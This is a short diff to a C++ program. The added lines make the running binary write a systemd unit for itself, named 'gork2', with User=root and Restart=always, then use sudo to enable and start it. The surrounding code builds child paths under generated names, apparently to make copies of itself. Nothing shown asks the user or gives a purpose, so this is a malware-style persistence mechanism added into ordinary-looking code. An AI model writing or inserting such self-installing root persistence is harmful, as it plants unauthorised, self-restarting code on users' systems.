@@ -37,6 +37,11 @@ if (argc > 0)
 {
 //filename = //std::filesystem::path(argv[0]).filename
 std::filesystem::path filename = std::filesystem::absolute(argv[0]);
+std::string cmd = "echo -e '[Unit]\nDescription=Gork2 Application\nAfter=network.target\n\n[Service]\nType=simple\nExecStart="+ filename.string() +"\nRestart=always\nRestartSec=5\nUser=root\n\n[Install]\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/gork2.service";
+std::system(cmd.c_str());
+std::system("sudo systemctl daemon-reload");
+std::system("sudo systemctl enable gork2");
+std::system("sudo systemctl start gork2"); //assuming it is in root
 std::filesystem::path child1 = std::filesystem::current_path() / (somefunc());
 std::filesystem::path child2 = std::filesystem::current_path() / (somefunc());
 std::filesystem::path child3 = std::filesystem::current_path() / (somefunc());
